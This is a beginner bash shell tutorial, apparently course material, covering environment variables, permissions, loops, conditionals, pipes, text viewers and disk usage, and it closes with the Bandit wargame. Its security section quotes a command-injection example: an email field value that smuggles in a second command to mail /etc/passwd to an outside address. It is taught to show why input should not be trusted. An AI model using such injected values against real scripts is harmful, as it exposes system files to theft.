# More about the UNIX shell

## Types of shell

Several shells are available, the most common ones being probably `bash` and `tcsh`.
In this tutorial, we will always refer to the `bash` shell, but keep in mind that other shells exist, which may sometimes have different syntax and behaviour!
To check the type of shell we are using we can type `echo` to display the value of the `$0` environment variable:

```echo $0```

which, if the shell in use is `bash`, returns

```
-bash
```

## Manual pages

Each command has a manual page where you can find more information on how to use it. The manual pages can be accessed through the `man` command, for example:

```man
man ls
```

But what if we are looking for a command, but don’t know or don’t remember its name?
In this case it might be useful to use the `apropos` command.
For example, if we want to list the contents of a directory, we could look for something like

```apropos "list directory"```

which will return a list of (possibly) relevant commands, together with their descriptions.
In this particular case:

```
dir                  (1)  - list directory contents
gfal-ls              (1)  - list directory contents or file information
ls                   (1)  - list directory contents
ls                   (1p)  - list directory contents
vdir                 (1)  - list directory contents
```

## Environment variables

In addition to `0`, some other common examples of environment variables are `EDITOR`, `PATH`, and `LD_LIBRARY_PATH`, whose value can be displayed by

```
echo $EDITOR
echo $PATH
echo $LD_LIBRARY_PATH
```

In particular, the `PATH` variable specifies in which directories programs can be found (for example, if we type `ls`, the command `ls` is searched for in such directories), while the `LD_LIBRARY_PATH` variable specifies where shared libraries are located.
Environment variables can be exported with

```
export VARNAME=value
```

This can be done from the command line or from within a `bash` script.
For example, let's create a `bash` script named `StarWars.sh`, having the following lines:

```
#!/bin/bash
echo "Hello Star Wars' world"
export CHARACTER="Anakin"
```

After saving and closing, we can run it from the shell with

```
bash StarWars.sh
```

or with

```
./StarWars.sh
```

the latter after changing the file permissions with `chmod u+x StarWars.sh`, so that the script can actually be executed.
The file permissions tell us who is allowed to do what to a given file or directory.
There are three basic [permission types](http://linuxcommand.org/lc3_lts0090.php) (read, write, and execute) and three sets of people to be given permissions (owner, users in the group, and users not in the group, where the group is defined for each file or directory and the group membership is configurable).
The owner and the group can be managed by the [`chown`](http://www.linfo.org/chown.html) and [`chgrp`](https://www.computerhope.com/unix/uchgrp.htm) commands.

What happens if we now write `echo $CHARACTER` in the terminal? Can you explain why?

### Let's now try the following: {.callout}

```
source StarWars.sh
```

or, equivalently:

```
. StarWars.sh
```

and then

```
./StarWars.sh
echo $CHARACTER
```

Is there any difference?

`Exercise (5 min):` Change the file permissions so that your friends can read, write, and execute (or not) the `StarWars.sh` shell script and try to set their Star Wars character to something you like.

## Variables

In `bash`, variables are usually interpreted as strings.
However, we can do integer arithmetic using the `let` keyword. Let's add to `StarWars.sh` the following lines:

```
A=1
B=2
strvar=$A+$B
let intvar=$A+$B
echo "strvar is ${strvar}, intvar is ${intvar}"
```

What can you notice?

## Differences among files

The `diff` command is used to compare files line by line.
To simply check for differing files:

```diff -q file1.dat file2.dat```

To show the output in two columns and suppress the common lines:

```diff -y —suppress-common-lines file1.dat file2.dat```

To show the unified diff:

```diff -u file1.dat file2.dat```

## Looping over files

In bash, loops have the following syntax:

```
for VARIABLE in LIST
do
  <something>
done
```

if the loop has to be repeated a fixed number of times, or:

```
while [ EXPRESSION ]
do
  <something>
done
```

if the loop has to be repeated until a condition is fulfilled.

## Conditionals

Conditionals have the following syntax:

```
if [ COND1 ]
then
    echo "COND1 evaluated to true"
elif [COND2 ]
then
    echo "COND2 evaluated to true"
else
    echo "Test not passed"
fi
```

`Exercise (5 min):` Create a text file and then write a script that checks whether the text file
- exists;
- is readable;
- is newer than another text file.

`Exercise (5 min):` In the `StarWars.sh` script, add some lines to check whether
- `A` is equal to `B`;
- `A` is smaller than `B`;
- `A` is larger than `B`.
Be careful! We might be tempted to use `>` and `<` inside the shell script, but they actually havea a different meaning for the shell, so `lt` and `gt` should be used instead.

## Linking commands

Let us consider the three following lines, in which we link the commands to list the files in the `Poems` and `Recipes` folders through the `;`, `&&`, or `||` operators:

```
ls Poems/*.txt; ls Recipes/*.txt
ls Poems/*.txt && ls Recipes/*.txt
ls Poems/*.txt || ls Recipes/*.txt
```

The `;` means execute the first, then the second; the `&&` means execute the first, then the second if the first was successful, while the `||` means execute the first, then the second if the first was not successful.

## Pipes and redirection

We already saw how to chain commands together, for example using the pipe to redirect the output of a command to a file or to feed it to another command.

`Exercise (5 min)`: Save in a file the lines containing the word "force" searching for them in all the files in the `Material/StarWars` folder.

Solution:

```
files=`ls StarWars/*.txt`
for file in $files; do grep —color -w "force" $file >> Sentences.dat; done
```

`Exercise (5 min):` Now do the same, but searching for a string provided by the user.

Solution:

There are two ways to supply inputs to a shell script.

Open `StarWars.sh` and add the following lines

```
files=`ls StarWars/*.txt`
echo "Enter the string to be looked for…"
read string
echo "Looking for: ${string}"
for file in $files; do grep —color -w $string $file >> Sentences2.dat; done
```

Another solution is to replace the lines above with

```
files=`ls StarWars/*.txt`
string=$1
echo "Looking for: ${string}"
for file in $files; do grep —color -w $string $file >> Sentences2.dat; done
```

where command line arguments are used, and run again with

```
. StarWars.sh
```

and

```
. StarWars.sh force
```

It must be noticed that the first argument is saved in the `$1` variable. What is, then, `$0`? This is the name of the shell script! And what is `$#`? This is the number of parameters!

What happens if we do not provide any argument?
We need to check that the string has been assigned, which can be done by adding

```
if [ -n "${string}" ]
then
    for file in $files; do grep —color -w $string $file >> Sentences.dat; done
else
    echo "No string provided."
    return
fi
```

What happens if we use `exit` instead of `return`?

Another useful command worth mentioning is `tee`, which allows to save the output into a file, but also to show it on the stdout (our screen):

```ls Poems/*.txt | tee ListOfFilesWithTee.dat```

If we want to append to the output file, we can use the `-a` option:

```ls Poems/*.txt | tee -a ListOfFilesWithTee.dat```

## Bash security

[Situations that can turn very wrong very quickly](http://i.stack.imgur.com/MI1tR.jpg), which means it is important to be aware of potentially dangerous behaviours.

It is a good practice to not trust input data, which is one of the most common reasons of security-related incidents.
Some examples are buffer overflow (that is, accepting input longer than the size of the allocated memory), invalid or malicious input, code inside data, and many others.

One practical example, provided by Sebastian Lopienski, is the following: let's say we wrote a script that sends emails using the `mail` command:

```cat confirmation.txt | mail $email```

and someone provides the following email address:

```me@fake.com; cat /etc/passwd | mail me@real.com```

So, what do we get?

```
cat confirmation.txt | mail me@fake.com;
cat /etc/passwd | mail me@real.com
```

Great!

## Complexity

Bash is great until a certain level of complexity is reached…so try to keep it simple!
What about [this](http://lhcb-release-area.web.cern.ch/LHCb-release-area/DOC/online/releases/v4r65/doxygen/df/dd9/src_2_lineshape_maker_8cpp__incl.png)?

## Text viewers

The `less` command, which is the improved version of an earlier program, called `more`, is used to read but not edit text files.
It allows to scroll both forwards and backwards through the text file, as well as to perform a basic search.
Up and down arrows (or `j` and `k`) allow to scroll through the text file, line by line, while `Ctrl+f` and `Ctrl+b` allow to scroll through the text file, page by page.
To go to a specific line, it is possible to type the number of the line and then press `G`.
To search for a string forward, press `/` and then type the string.
To search for a string backward, press `?` and then type the string.
To quit, press `q`.

The `cat` command is even simpler than `less`, since it just outputs the contents of one or more files to the standard output.

```
cat file.dat
cat file1.dat file2.dat
```

But it is very powerful when linking commands!

Finally, the `head`/`tail` commands print the first(last) n lines of a given file:

```
head -n 2 file.dat
head -n 2 file1.dat file2.dat
```

## Text editors

Text editors allow not only to read, but also to modify the contents of a text file.
There are text editors available for every taste, and this is for sure a not-exhaustive list of those you may find along your way:
- `vim` or simply `vi`
- `emacs`
- `nano`
- `gedit`

## Disk space

At some point we all need to check how much space we are using.
For doing that, we can use the `df` and `du` commands.
The `df` command displays the disk usage and remaining free space on all currently mounted devices:

```
df
```

We can specify the option `-h` to convert to human readable units (kB, MB, GB, …):

```
df -h
```

and a directory, if we want to inspect only that:

```
df -h directory
```

The `du` command is similar to `df`, but goes recursively in all subdirectories of the present working directory:

```
du
```

If the option `-s` is specified,

```
du -s
```

it checks the present working directory only. As for `df`, the `-h` option allows to have human readable units.
Another interesting option is

```
du —max-depth=N
```

which allows to go `N` directories deep.

## Over the Wire and Bandit wargame

And to conclude...let's start a 20 min wargame on [Over the Wire](http://overthewire.org/wargames/bandit/) and compete to earn a delicious cold beer to be served soon after the session itself!

Bandit is a wargame aimed at absolute beginners.
It is organised in levels, each level requiring to having completed the previous one. Don’t panic if you have no clue how to proceed:
	- try using the manual, by typing man <command> (even man has a man) and then type q to quit the manual pages;
	- for shell built-in commands, try with help <command>;
	- ask Google or your favourite search engine!


